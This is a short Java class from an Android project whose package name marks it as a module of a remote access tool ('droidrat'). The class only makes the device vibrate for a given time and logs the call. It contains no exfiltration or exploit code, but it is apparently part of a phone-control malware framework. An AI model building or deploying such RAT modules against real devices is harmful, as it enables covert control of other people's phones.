package com.je_chen.droidrat_je.rat.modules.vibrator;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Vibrator;
import android.util.Log;

public class VibratorSystem {

    private Vibrator vibrator;

    final String TAG = "JE-TAG";

    @SuppressLint("ServiceCast")
    public VibratorSystem(Context context){
        this.vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
    }

    public void startVibrator(int millSec){
        this.vibrator.vibrate(millSec);
        Log.e(TAG,"startVibrator");
    }
}
